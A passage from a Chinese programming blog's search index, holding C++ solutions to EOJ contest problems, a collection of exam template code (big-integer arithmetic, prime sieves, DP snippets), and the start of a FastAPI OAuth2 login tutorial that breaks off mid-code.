ll;const int maxn = 1e5+5;ll a[maxn], b[maxn], ans;int n;inline ll fun(ll mid){ ll ret = 0; for (int i = 1; i &lt;= n; ++i) ret += abs(mid - a[i]); return ret;}int main(){ cin &gt;&gt; n; b[2] = 2; for (int i = 3; i &lt;= n; ++i) b[i] = b[i-1] + i; for (int i = 1; i &lt;= n; ++i) { scanf(&quot;%lld&quot;, a+i); a[i] -= b[i]; } sort(a+1, a+1+n); printf(&quot;%lld\\n&quot;, fun(a[(n+1)&gt;&gt;1])); return 0;} F 对于给定的数字串$a_1,a_2,a_3,…,a_n$，每次可以进行如下操作: 选择一个数 i (1 &lt; i &lt; n)，将 $a_i$ 变成 $a_{i+1}+a_{i−1}−a_i$。问在经过任意多次的操作后，该数列的数字总和最小为多少？1 ≤ n ≤ 1e5，0 ≤ ai ≤ 1e10 令$c_i=a_{i+1}-a_i$，这样 c 数列有 n-1 项。注意到对$a_i$的操作等价于交换$c_i$与$c_{i+1}$，那么通过将 c 升序排序后反构造出的 a 数列就是总和最小的数列啦。 12345678910111213141516171819202122232425#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 1e5+5;ll a[maxn], c[maxn], sum;int main(){ int n; cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) scanf(&quot;%lld&quot;, a+i); for (int i = 0; i &lt; n-1; ++i) c[i] = a[i+1] - a[i]; sort(c, c + n-1); sum = a[0]; for (int i = 1; i &lt; n; ++i) { a[i] = a[i-1] + c[i-1]; sum += a[i]; } printf(&quot;%lld\\n&quot;, sum); return 0;} Week 3D n 个椅子，c 种颜色排成一圈，间隔 1m。随机选一种颜色，你要马上移动到这种颜色的椅子上（原本颜色相同则不动）。求走动距离的最小期望（输出最简分数）。1 ≤ c ≤ n ≤ 1e6 据说暴力模拟+优化（n^2---&gt;nlogn？）2.5s 内可过……不过这里用了一些数学知识，复杂度降到O(n)。（其实是2n，不过 EOJ 评测姬太快了，可以忽略）首先肯定是常规的环拆链操作：复制一份放到后面去。这样就可以规定正方向为向右，从左往右扫描了。要求出答案，关键在于求出要坐的这个位置。要求出这个位置，无疑需要求出位置 i 到各个颜色椅子的最短期望距离和$d(i)$。设$D(i,k)$为椅子 i 到颜色为 k 的椅子的最短期望距离。即：$$d(i)=\\sum_{k=1}^cD(i,k)$$我们发现，对每一个 k，$D(i,k)$是一个关于 i 的分段函数： i 在距离最近的颜色为 k 的椅子左边，则 i 每右移一次，离该椅子的距离-1，此时$D’(i,k)=-1$； 同理，i 在距离最近的颜色为 k 的椅子右边，则 i 每右移一次，离该椅子的距离+1，此时$D’(i,k)=+1$； 于是在中间某个时刻，我们移动到了这张椅子上，此时$D’(i,k)=0$，这里是函数的驻点。再求（伪）二阶导，由于一阶导在这个点从-1 变成了+1，我们可以认为（伪）二阶导$D’’(i,k)=+2$。（这样设定二阶导是为了方便后面求一阶导和答案） 再考虑两个相邻的同色（k）椅子：当经过两者中点前，我们离左边椅子的距离小于离右边椅子的距离，反之亦然。也就是说，在经过两者中点时，$D’(i,k)$由+1 变为了-1（中间的椅子数为奇时，会在中点处变为 0）。因此，需要对$ceil((i+j)/2)$和$floor((i+j)/2)$这两个点（中间的椅子数为奇时，一个点）的二阶导分别减 1。 综上，二阶导处理完毕。对二阶导求前缀和并且每项减 c，得到一阶导。再对一阶导求前缀和（注意特判，第 0 个位置就是-c），得到每个位置的$d(i)$，最后取最小值，这题就终于做完了…… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const int maxn = 2e6+5;int n, c, a[maxn], nxt[maxn];ll d[maxn];ll gcd(ll a, ll b){ return b ? gcd(b, a%b) : a;}int main(){ cin &gt;&gt; n &gt;&gt; c; for (int i = 1; i &lt;= n; ++i) scanf(&quot;%d&quot;, a+i); for (int i = n+1; i &lt;= (n&lt;&lt;1); ++i) a[i] = a[i-n]; n &lt;&lt;= 1; for (int i = n; i &gt;= 1; --i) { d[i] += 2; int &amp;j = nxt[a[i]]; if (j) { d[(i+j)&gt;&gt;1] -= 1; d[(i+j+1)&gt;&gt;1] -= 1; } j = i; } for (int i = 1; i &lt;= n; ++i) d[i] += d[i-1]; d[0] = -c; for (int i = 1; i &lt;= n; ++i) d[i] += -c; ll sum = 0; for (int i = 1; i &lt;= n; ++i) { int &amp;j = nxt[a[i]]; if (j) { sum += i; j = 0; } } ll ans = (ll)n * n; for (int i = 1; i &lt;= n; ++i) { sum += d[i-1]; if (sum &lt; ans) ans = sum; } ll g = gcd(ans, c); ans /= g; c /= g; printf(&quot;%lld/%d\\n&quot;, ans, c);} E EOJ 的登录系统爆出了一个重大问题，当正确的密码是你输入的密码的子串时，就可以成功登录！例如你的密码是 abc，则你输入 abcc，aabc，甚至 dfjklsdfabcsdjfkl，都可以成功登录！出现了这么大的问题，那就一定要有人来背锅，管理员们希望在背锅之前先衡量一下锅的大小。现在有一份 EOJ 用户的密码表，里面包含了 n 个用户的密码，第 i 个用户的密码是 pwdi。我们定义锅的大小为所有有序对 (i,j) (i≠j) 的数量，使得用户 i 能够输入他的密码 pwdi 成功登陆用户 j 的账户。换句话说，我们现在需要知道，有多少有序对 (i,j) (i≠j) 使得 pwdj 是 pwdi 的子串。第 1 行包含一个整数 n，1≤n≤20 000，表示密码表中密码的数量。第 1+i (1≤i≤n) 行包含一个长度不超过 10 且由小写字母组成的字符串，表示 pwdi。 因为长度太短了，所以可以直接枚举子串（每个密码最多 55 个子串），hash 一下存进map里统计子串的出现次数。然后对于每个密码，计算其在子串中出现的次数。记得要减去 n，因为每个密码也一定是自己的子串。 1234567891011121314151617181920212223242526272829303132333435#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 20005;typedef long long ll;ll SS[maxn];set&lt;ll&gt; S[maxn];map&lt;ll, int&gt; m;char s[15];int n, ans, len;int main(){ cin &gt;&gt; n; for (int i = 0; i &lt; n; ++i) { scanf(&quot;%s&quot;, s); len = strlen(s); for (int j = 0; j &lt; len; ++j) { ll h = 0; for (int k = j; k &lt; len; ++k) { h = h * 29 + s[k]-'a'+1; S[i].insert(h); if (!j &amp;&amp; k+1 == len) SS[i] = h; } } for (auto x: S[i]) ++m[x]; } for (int i = 0; i &lt; n; ++i) ans += m[SS[i]]; printf(&quot;%d\\n&quot;, ans-n); return 0;} Week 4D有一个数列 $A_n$，其中 $A_1=1,A_2=2,A_{n+2}=A_{n+1}+A_n$。给你一个数字，问他是这个数列的第几项。每行包括数列中的一项 $A_k$ (k≤100000)。总行数 T≤100。 看到标题以为是很水的题……实际上，斐波那契数列的 100000 项是一个超出long long范围的数，因此一开始考虑用高精度。后来发现数据加强了，时限和内存又比较紧(卡掉了我的 python 预处理算法&amp;&amp;python 滚动暴力算法&amp;&amp;C++高精度+二分查找算法)，只能使用一些技巧。类似 hash，用一个大质数（比如 19260817）将斐波那契数列的各项 hash 掉，再利用同余定理查找答案，就做完了……？ 123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1e5+5;const int p = 19260817;int now, f[maxn];map&lt;int, int&gt; m;string s;int main(){ f[0] = f[1] = 1; m[1] = 1; for (int i = 2; i &lt; maxn; ++i) { f[i] = (f[i-1] + f[i-2]) % p; m[f[i]] = i; } while (cin &gt;&gt; s) { now = 0; for (auto &amp;i: s) now = (now*10 + i-'0') % p; printf(&quot;%d\\n&quot;, m[now]); } return 0;}","link":"/post/EOJTraining/"},{"title":"程序设计能力实训 资料准备","text":"其实差不多就是低难度模板集合。 如果来得及会加上一些库函数的使用方法……EOJ上已故的10175101282Mercury的Blog里面包含的这里就不重复写了。其实主要都是数论相关。 注意：C++限定。 高精度123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114//加法（非负）inline string add(string s1, string s2){ string s; int len1 = s1.size(), len2 = s2.size(); if (len1 &lt; len2) for (int i = 1; i &lt;= len2-len1; ++i) s1 = &quot;0&quot; + s1; else for (int i = 1; i &lt;= len1-len2; ++i) s2 = &quot;0&quot; + s2; len1 = s1.size(); int plus = 0, tmp; for (int i = len1-1; i &gt;= 0; --i) { tmp = s1[i]-'0' + s2[i]-'0' + plus; plus = tmp / 10; tmp %= 10; s = char(tmp+'0') + s; } if (plus) s = char(plus+'0') + s; return s;}//减法inline int cmp(const string&amp; s1, const string&amp; s2){ if (s1.size() &gt; s2.size()) return 1; else if (s1.size() &lt; s2.size()) return -1; else return s1.compare(s2);}inline string subtract(string s1, string s2){ string s; if (!cmp(s1, s2)) return &quot;0&quot;; if (cmp(s1, s2) &lt; 0) {putchar('-'); swap(s1, s2);} int tmp = s1.size() - s2.size(), minus = 0; for (int i = s2.size()-1; i &gt;= 0; --i) { if (s1[i+tmp] &lt; s2[i]+minus) { s = char(s1[i+tmp] - s2[i] - minus + '0'+10) + s; minus = 1; } else { s = char(s1[i+tmp] - s2[i] - minus + '0') + s; minus = 0; } } for (int i = tmp-1; i &gt;= 0; --i) { if (s1[i] - minus &gt;= '0') { s = char(s1[i]-minus) + s; minus = 0; } else { s = char(s1[i] - minus + 10) + s; minus = 1; } } s.erase(0, s.find_first_not_of('0')); return s;}//乘法（非负）(需要前面的add)inline string mul(string s1, string s2){ string s, stmp; int len1 = s1.size(), len2 = s2.size(); for (int i = len2-1; i &gt;= 0; --i) { stmp = &quot;&quot;; int tmp = s2[i]-'0', plus = 0, t = 0; if (tmp) { for (int j = 1; j &lt;= len2-i-1; ++j) stmp += &quot;0&quot;; for (int j = len1-1; j &gt;= 0; --j) { t = (tmp*(s1[j]-'0') + plus) % 10; plus = (tmp*(s1[j]-'0') + plus) / 10; stmp = char(t+'0') + stmp; } if (plus) stmp = char(plus+'0') + stmp; } s = add(s, stmp); } s.erase(0, s.find_first_not_of('0')); if (s.empty()) s = &quot;0&quot;; return s;}//阶乘void fact(int n){ int result[10005]; memset(result, 0, sizeof(result)); result[0] = 1; for (int i = 2; i &lt;= n; ++i) { int left = 0; for (int j = 0; j &lt; 10000; ++j) { result[j] = left + result[j] * i; left = result[j] / 10; result[j] %= 10; } } int k = 9999; while (!result[k]) k--; for (int i = k; i &gt;= 0; --i) printf(&quot;%d&quot;, result[i]); printf(&quot;\\n&quot;);} 除法比较特殊，单独拿出来（非负,需要前面的subtract和mul,除数不能为0）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647inline void div(string s1, string s2, string&amp; quot, string&amp; rem){ quot = rem = &quot;&quot;; if (s1 == &quot;0&quot;) { quot = rem = &quot;0&quot;; return; } int comp = cmp(s1, s2); if (comp &lt; 0) { quot = &quot;0&quot;; rem = s1; return; }else if (!comp) { quot = &quot;1&quot;; rem = &quot;0&quot;; return; } else { int len1 = s1.size(), len2 = s2.size(); string stmp; stmp.append(s1, 0, len2-1); for (int i = len2-1; i &lt; len1; ++i) { stmp += s1[i]; stmp.erase(0, stmp.find_first_not_of('0')); if (stmp.empty()) stmp = &quot;0&quot;; for (char c = '9' ; c &gt;= '0'; --c) { string s, tmp; s += c; tmp = mul(s2, s); if (cmp(tmp, stmp) &lt;= 0) { quot += c; stmp = subtract(stmp, tmp); break; } } } rem = stmp; } quot.erase(0, quot.find_first_not_of('0')); if (quot.empty()) quot = &quot;0&quot;;} 大整数类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130struct BigInteger{ static const int BASE = 1e8; static const int WIDTH = 8; vector&lt;int&gt; s; BigInteger(long long num = 0) { *this = num; } BigInteger operator = (long long); BigInteger operator = (const string&amp;); BigInteger operator + (const BigInteger&amp;) const; BigInteger operator - (const BigInteger&amp;) const; BigInteger operator * (const BigInteger&amp;) const; BigInteger operator / (const BigInteger&amp;) const; BigInteger operator += (const BigInteger&amp;); BigInteger operator -= (const BigInteger&amp;); BigInteger operator *= (const BigInteger&amp;); BigInteger operator /= (const BigInteger&amp;); bool operator &lt; (const BigInteger&amp;) const; bool operator &gt; (const BigInteger&amp;) const; bool operator &lt;= (const BigInteger&amp;) const; bool operator &gt;= (const BigInteger&amp;) const; bool operator != (const BigInteger&amp;) const; bool operator == (const BigInteger&amp;) const;};BigInteger BigInteger::operator = (long long num) //重载=运算符(数字赋值){ s.clear(); do { s.push_back(num%BASE); num /= BASE; }while (num &gt; 0); return *this;}BigInteger BigInteger::operator = (const string&amp; str) //重载=运算符(字符串赋值){ s.clear(); int x, len = (str.length() - 1) / WIDTH + 1; for (int i = 0; i &lt; len; ++i) { int end = str.length() - i * WIDTH; int start = max(0, end-WIDTH); sscanf(str.substr(start, end-start).c_str(), &quot;%d&quot;, &amp;x); s.push_back(x); } return *this;}BigInteger BigInteger::operator + (const BigInteger&amp; b) const //重载+运算符{ BigInteger c; c.s.clear(); for (int i = 0, g = 0; ; ++i) { if (!g &amp;&amp; i &gt;= s.size() &amp;&amp; i &gt;= b.s.size()) break; int x = g; if (i &lt; s.size()) x += s[i]; if (i &lt; b.s.size()) x += b.s[i]; c.s.push_back(x%BASE); g = x / BASE; } return c;}BigInteger BigInteger::operator += (const BigInteger&amp; b) //重载+=运算符{ *this = *this + b; return *this;}bool BigInteger::operator &lt; (const BigInteger&amp; b) const //重载&lt;运算符{ if (s.size() != b.s.size()) return s.size() &lt; b.s.size(); for (int i = s.size()-1; i &gt;= 0; --i) if (s[i] != b.s[i]) return s[i] &lt; b.s[i]; return false;}bool BigInteger::operator &gt; (const BigInteger&amp; b) const //重载&gt;运算符{ return b &lt; *this;}bool BigInteger::operator &lt;= (const BigInteger&amp; b) const //重载&lt;=运算符{ return !(b &lt; *this);}bool BigInteger::operator &gt;= (const BigInteger&amp; b) const //重载&gt;=运算符{ return !(*this &lt; b);}bool BigInteger::operator != (const BigInteger&amp; b) const //重载!=运算符{ return b &lt; *this || *this &lt; b;}bool BigInteger::operator == (const BigInteger&amp; b) const //重载==运算符{ return !(b &lt; *this) || !(*this &lt; b);}ostream&amp; operator &lt;&lt; (ostream&amp; out, const BigInteger&amp; x) //重载&lt;&lt;运算符{ out &lt;&lt; x.s.back(); for (int i = x.s.size()-2; i &gt;= 0; --i) { char buf[20]; sprintf(buf, &quot;%08d&quot;, x.s[i]); for (int j = 0; j &lt; strlen(buf); ++j) out &lt;&lt; buf[j]; } return out;}istream&amp; operator &gt;&gt; (istream&amp; in, BigInteger&amp; x) //重载&gt;&gt;运算符{ string s; if (!(in &gt;&gt; s)) return in; x = s; return in;} 快速幂取模12345678910111213typedef long long ll;ll pow_mod(int a, int b, int p){ ll ret = 1; while (b) { if (b&amp;1) ret = (ret * a) % p; a = (a * a) % p; b &gt;&gt;= 1; } return ret;} 扩展欧几里得12345678910111213int extgcd(int a, int b, int &amp;x, int &amp;y){ if (!b) { x = 1; y = 0; return a; } int d = extgcd(b, a % b, x, y); int t = x; x = y; y = t - a / b * y; return d;} 素数相关12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273//欧拉筛const int maxn = 1e7+5;bool np[maxn]{true,true};vector&lt;int&gt; prime;int main(){ int n, m, x; cin &gt;&gt; n &gt;&gt; m; for (int i = 2; i &lt;= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j &lt; prime.size() &amp;&amp; i*prime[j] &lt;= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i &lt;= m; ++i) { scanf(&quot;%d&quot;, &amp;x); printf(&quot;%s\\n&quot;, np[x] ? &quot;No&quot; : &quot;Yes&quot;); } return 0;}//埃氏筛const int maxn = 1e6+5;bool np[maxn]{true, true};void init(){ for (int i = 2; i &lt; maxn; i++) if (!np[i]) { if (i &gt; maxn/i) continue; //或用ll省去这一步 for (int j = i*i; j &lt; maxn; j += i) np[j] = true; }}//单独判断 O(sqrt(n))typedef long long ll;inline bool isprime(ll m){ for (ll i = 2; i * i &lt;= m; ++i) if (!(m % i)) return false; return true;}//区间筛typedef long long ll;const int maxn = 1e6+5;ll a, b;bool isp[maxn], ispsmall[maxn];void seg_sieve(){ for (ll i = 2; i*i &lt;= b; ++i) ispsmall[i] = true; for (ll i = 0; i &lt;= b-a; ++i) isp[i] = true; for (ll i = 2; i*i &lt;= b; ++i) if (ispsmall[i]) { for (ll j = (i&lt;&lt;1); j*j &lt;= b; j += i) ispsmall[j] = false; for (ll j = max(2LL, (a+i-1)/i) * i; j &lt;= b; j += i) isp[j-a] = false; } if (a &lt;= 1) isp[1-a] = false; bool flag = false; for (ll i = 0; i &lt;= b-a; ++i) if (isp[i]) { if (flag) printf(&quot; %lld&quot;, i+a); else flag = true, printf(&quot;%lld&quot;, i+a); } flag ? puts(&quot;&quot;) : puts(&quot;no prime number.&quot;);} 约瑟夫12345678910111213141516171819int n, m;vector&lt;int&gt; v;int main(){ cin &gt;&gt; n &gt;&gt; m; if (!n &amp;&amp; !m) return 0; for (int i = 1; i &lt;= n; ++i) v.push_back(i); int kill = 0; while (v.size() &gt; 1) { kill = (kill+m-1) % v.size(); printf(&quot;%d &quot;, v[kill]); v.erase(v.begin()+kill); } printf(&quot;%d\\n&quot;, v[0]); return 0;} 组合数计算12345678910111213typedef long long ll;ll C[41][41];void calc(){ C[1][0] = C[1][1] = 1; for(int i = 2; i &lt;= 40; ++i) { C[i][0] = 1; for(int j = 1; j &lt;= i; ++j) C[i][j] = C[i-1][j] + C[i-1][j-1]; }} LIS（nlogn）1234fill(f, f+n, INF);for (int i = 0; i &lt; n; ++i) *lower_bound(f, f+n, a[i]) = a[i];printf(&quot;%d\\n&quot;, lower_bound(f, f+n, INF) - f); 闰年判断1234bool is_leap(int n){ return ((n % 4 == 0 &amp;&amp; n % 100)|| n % 400 == 0) ? 1 : 0;} 输出给定日期是星期几123456789101112131415161718192021222324252627int main(){ int y, m, d; scanf(&quot;%d-%d-%d&quot;, &amp;y, &amp;m, &amp;d); if (m == 1 || m == 2){ --y; m += 12; } int c = y / 100; int yy = y - c * 100; int day = yy + yy / 4 + c / 4 - 2 * c + 13 * (m + 1) / 5 + d - 1; if (y &lt;= 1582 &amp;&amp; m &lt;= 10 &amp;&amp; d &lt;= 4) day += 3; while (day &lt; 0) day += 7; day %= 7; switch(day){ case 1: printf(&quot;Monday\\n&quot;);break; case 2: printf(&quot;Tuesday\\n&quot;);break; case 3: printf(&quot;Wednesday\\n&quot;);break; case 4: printf(&quot;Thursday\\n&quot;);break; case 5: printf(&quot;Friday\\n&quot;);break; case 6: printf(&quot;Saturday\\n&quot;);break; default: printf(&quot;Sunday\\n&quot;); } return 0;} 一些巧算方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//n!低位0的个数int main(){ int t,i,n,m,z; scanf(&quot;%d&quot;, &amp;t); for (i = 0; i &lt; t; i++){ scanf(&quot;%d&quot;, &amp;n); m = 5;z = 0; while (n &gt;= m){ z += n / m; m *= 5; } printf(&quot;case #%d:\\n%d\\n&quot;, i, z); } return 0;}//n!最高位int main(){ int n,fn; double log_n_fac; while (scanf(&quot;%d&quot;, &amp;n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling's approximation switch(n){ case 0:printf(&quot;1\\n&quot;);break; case 1:printf(&quot;1\\n&quot;);break; case 2:printf(&quot;2\\n&quot;);break; case 3:printf(&quot;6\\n&quot;);break; case 7:printf(&quot;5\\n&quot;);break; case 8:printf(&quot;4\\n&quot;);break; default:printf(&quot;%d\\n&quot;, fn); } } return 0;}//n^n最高位int main(){ int n; scanf(&quot;%d&quot;,&amp;n); while(n != 0){ printf(&quot;%d\\n&quot;,(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(&quot;%d&quot;,&amp;n); } return 0;} 质因子分解12345678910111213141516int n;void solve(){ int i; int m = n; for (i = 2; i &lt;= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(&quot;(%d,%d)&quot;, i, cnt); if (m == 1) break; } printf(&quot;\\n&quot;);} 最长回文子串1234567891011121314151617181920212223//中心扩展法string expand(string s, int c1, int c2) { int l = c1, r = c2; int n = s.size(); while (l &gt;= 0 &amp;&amp; r &lt;= n-1 &amp;&amp; s[l] == s[r]) l--, r++; return s.substr(l+1, r-l-1);}string lps(string s) { int n = s.size(); if (!n) return &quot;&quot;; string lungo = s.substr(0, 1); for (int i = 0; i &lt; n-1; i++) { string p1 = expand(s, i, i); if (p1.size() &gt; lungo.size()) lungo = p1; string p2 = expand(s, i, i+1); if (p2.size() &gt; lungo.size()) lungo = p2; } return lungo;} 最大区间和123456ans = a[0];for (i = 0; i &lt; n; ++i){ if (tot &gt; 0) tot += a[i]; else tot = a[i]; ans = (tot&gt;ans)?tot:ans;} 小型分数模板123456789101112131415161718192021222324252627282930313233343536struct frac{ ll nume, deno; ll gcd(ll a, ll b) { a = abs(a); b = abs(b); return b ? gcd(b, a % b) : a; } void reduct() { if(!nume) { deno = 1; return; } ll g = gcd(nume, deno); nume /= g; deno /= g; return; } frac(ll a, ll b = 1) { nume = a; deno = b; (*this).reduct(); } void print() { if(deno == 1) printf(&quot;%lld\\n&quot;, nume); else printf(&quot;%lld/%lld\\n&quot;, nume, deno); }};frac operator+(const frac&amp; a, const frac&amp; b){ frac ret(a.nume*b.deno + b.nume*a.deno, a.deno*b.deno); ret.reduct(); return ret;} 简单DP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//01背包for (i = 0; i &lt; n; ++i) for (j = m; j &gt;= w[i]; --j) dp[j] = max(dp[j], dp[j-w[i]] + c[i]);//最大上升子序列和(n^2)for (i = 0; i &lt; n; ++i) dp[i] = a[i];nowmax = a[0];for (i = 0; i &lt; n; ++i) for (int j = 0; j &lt; i; ++j) if (a[j] &lt; a[i]) { dp[i] = max(dp[i], dp[j] + a[i]); nowmax = max(nowmax, dp[i]); }//整数拆分for (i = 1; i &lt;= n; ++i) for (j = 2; j &lt;= n; ++j) { dp[i][j] = dp[i][j - 1]; if (i == j) ++dp[i][j]; else if(i &gt; j) dp[i][j] += dp[i - j][j]; }//拆成2的幂和for (int i = 3; i &lt;= 1000000; ++i){ if (i &amp; 1) dp[i] = dp[i-1] % mod; else dp[i] = (dp[i-2] + dp[i&gt;&gt;1]) % mod;}//拆成不重复正整数dp[0] = 1;for (int i = 1; i &lt;= m; ++i) for (int j = n; j &gt;= i; --j) dp[j] += dp[j-i];//数塔(和最小)for (i = n-1; i &gt;= 0; --i) for (j = 0; j &lt;= i; ++j) dp[j] = min(dp[j], dp[j+1]) + a[i][j];//数塔(和的个位数最大)for (i = 0; i &lt; n; ++i) dp[n-1][i][a[n-1][i] % 10] = 1;for (i = n-2; i &gt;= 0; --i) for (j = 0; j &lt;= i; ++j) for (k = 0; k &lt; 10; ++k) if (dp[i+1][j][k] || dp[i+1][j+1][k]) dp[i][j][(k + a[i][j]) % 10] = 1;for (i = 9; i &gt;= 0; --i) if (dp[0][0][i]){printf(&quot;%d\\n&quot;, i); break;}//装箱问题(dp)for (i = 0; i &lt; n; ++i){ scanf(&quot;%d&quot;, &amp;w); for (j = m; j &gt;= w; --j) dp[j] = max(dp[j], dp[j-w] + w);}//装箱问题(搜索)void dfs(int cnt, int now){ if (now &gt; v) return; if (cnt == n + 1){ if (now &gt; max) max = now; return; } dfs(cnt + 1, now); dfs(cnt + 1, now + a[cnt]);} 十六进制加法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const int N = 233;struct bigNum{ int a[N]; bigNum(){ memset(a,sizeof(a),0); for (int i=0;i&lt;N;i++)a[i] = 0; } void print(){ for (int i = a[0]; i&gt;0; i--){ printf(&quot;%X&quot;,a[i]); } puts(&quot;&quot;); } bigNum operator + (const bigNum &amp;b){ bigNum c; c.a[0] = max(a[0], b.a[0]); int x = 0; for (int i=1;i&lt;=c.a[0];i++){ //printf(&quot;b[i] = %d&quot;, b.a[i]); x += a[i] + b.a[i]; c.a[i] = x % 16; x /= 16; } if (x) c.a[++c.a[0]] = x; return c; }}a, b;int qd(char x){ if ('0' &lt;= x &amp;&amp; x &lt;= '9')return x - '0'; return x - 55;}bigNum jd(string st){ bigNum ans; ans.a[0] = st.length(); for (int i=1; i &lt;= ans.a[0]; i++){ ans.a[i] = qd(st[ans.a[0] - i]); } return ans;}int main(){ int T;scanf(&quot;%d&quot;, &amp;T); string st1, st2; for (int cas = 0;cas &lt; T;cas++){ printf(&quot;case #%d:\\n&quot;, cas); cin &gt;&gt; st1 &gt;&gt; st2; a = jd(st1); b = jd(st2); bigNum c = a + b; c.print(); } return 0;} 另外放一些EOJ上具有代表性的题，遇到类似的直接看提交记录就可以了： 区间筛法——49 埃氏筛因子——3469 谦虚数/丑数类似——1277 查单词——3018 多项式处理——2，2845 KMP——3441 乱搞输出图形——2983 约瑟夫——1849，1982，3030 分数相关——3041，2980，2972 基础的大法师（雾）/剪枝/前缀和等等——3490 内存相关——2822 floodfill——2848 部分库函数123456789101112131415161718192021222324252627282930313233int isgraph(int ch) 是否是可打印字符(不含空格)int isprint(int ch) 是否是可打印字符(含空格)int ispunct(int ch)double atan2(double y, double x) y/x的反正切(弧度)int atoi(char *nptr)double strtod(char *str)int sscanf(char str, char *format) 通过str格式化赋值char strcpy(char* dest, char* src)char strcat(char* dest, char* src)char strchr(const char *s1, int c)int strcmp(const char* s1, const char* s2) 返回s1-s2int strncmp(const char* s1, const char* s2, size_t maxlen)char strrev(char *s)char strstr(const char* s1, const char* s2) s2中第一次出现s1的位置string s(cstr[, chars_len]);string s(num, c);{string s(“abcd”);s.compare(“abcd”); //0s.compare(“dcba”); //&lt;0s.compare(“ab”); //&gt;0s.compare(0,2,s,2,2); //比较ab和cd &lt;0}s.assign(“nico”,5);//’n’’i’’c’’o’’\\0’s.insert(1,str);//插入到索引前s.replace(1,2,”nternationalizatio”);//从1开始的2个s.erase(13);//从13开始往后全删除s.erase(7,5);//从7开始往后删5个string::find系列：1. 搜索对象2. [起点索引]3. [搜索字符个数]","link":"/post/ExamPreparation/"},{"title":"基于 FastAPI 实现 OAuth2 登录认证","text":"写 Pianoforte 时第一个遇到的可复用模块。 最近在通过项目学习 FastAPI，发现登录认证模块可以复用，于是记录一下。代码主要修改自官方文档。 目录结构1234567891011121314151617.|--app.db|--requirements.txt|--app/| |--__init__.py| |--config.py| |--db.py| |--main.py| |--models.py| |--projects/| |--users/| | |--__init__.py| | |--auth.py| | |--config.py| | |--crud.py| | |--schemas.py| | |--users.py 最外层是 sqlite 数据库文件和依赖，projects/ 目录和主题无关因此未列出。 现有代码main.py1234567891011121314151617181920212223242526272829from fastapi import Depends, FastAPI, HTTPExceptionfrom fastapi.middleware.cors import CORSMiddlewarefrom .db import enginefrom . import models, configfrom .users import users, authfrom .projects import projectsmodels.Base.metadata.create_all(bind=engine)app = FastAPI( title='Pianoforte', description='Pianoforte Is AN Offensive Framework Of Red TEam', version='0.1.0')app.add_middleware( CORSMiddleware, allow_origins=config.allow_origins, allow_credentials=True, allow_methods=config.allow_methods, allow_headers=['*'])app.include_router(users.router, prefix='/users', tags=['users'])auth_needed = [Depends(auth.get_current_user)]app.include_router(projects.router, prefix='/projects', tags=['projects'], dependencies=auth_needed) 首先根据 models.py 中的定义创建了数据库，数据库相关代码在 db.py 中。随后添加 CORS 中间件，并添加 users 路由和 projects 路由，后者需要认证后方能访问。我们通过 Dependency 的方式，要求 auth.get_current_user 函数运行正常才能访问 projects 路由，由此实现权限管理。 db.py123456789101112131415161718192021from sqlalchemy import create_enginefrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import sessionmakerSQLALCHEMY_DATABASE_URL = &quot;sqlite:///./app.db&quot;# SQLALCHEMY_DATABASE_URL = &quot;postgresql://user:password@postgresserver/db&quot;engine = create_engine( SQLALCHEMY_DATABASE_URL, connect_args={&quot;check_same_thread&quot;: False})SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)Base = declarative_base()def get_db(): db = SessionLocal() try: yield db finally: db.close() 由于项目规模不大，选用 sqlite3 数据库配合 sqlalchemy 的 ORM 功能进行数据库操作。 此处 yield 方式返回数据库 Session 需要 Python 3.7 及以上。 models.py1234567891011from sqlalchemy import Column, Integer, Stringfrom .db import Baseclass User(Base): __tablename__ = 'users' id = Column(Integer, primary_key=True, index=True) username = Column(String, unique=True) password = Column(String) 这里仅展示了相关代码，即 User 类的字段。这一段代码在数据库中创建了 users 表来存放用户数据。 由于业务需要，限定 username 不能重复。 users/schemas.py上面的 models.py 定义了数据库中的 User 类，而在本文件中定义了两种语义下的 User 类： 12345678910111213141516from pydantic import BaseModelclass UserBase(BaseModel): username: strclass UserCreate(UserBase): password: strclass User(UserBase): id: int class Config: orm_mode = True 其一是在注册与登录时使用的 UserCreate 类，此时不需要传输 id；其二是在获取用户信息时返回的 User 类，此时不需要传输 password但需要 id。 users/crud.py12345678910111213141516from sqlalchemy.orm import Sessionfrom ..models import Userfrom . import schemasdef get(db: Session, username: str): return db.query(User).filter_by(username=username).first()def create(db: Session, param: schemas.UserCreate): target = User(**param.dict()) db.add(target) db.commit() db.refresh(target) return target 关于数据库操作，这里只涉及到增和查操作。由于 username 唯一，可以使用 username 作为关键字查询。 在插入数据前，需要将用户传入的数据解构并构建 User 数据库对象。 认证功能实现我们计划用 OAuth2 的用户名密码认证，并将用户密码哈希后存入数据库。为了维护登陆状态，这里采用 jwt 代替较为繁琐的 cookie 机制。 注册注册部分较为简单（验证码等部分与主题无关，未展示），在 users.py 中编写路由函数： 1234567891011121314151617181920from fastapi import APIRouter, Depends, 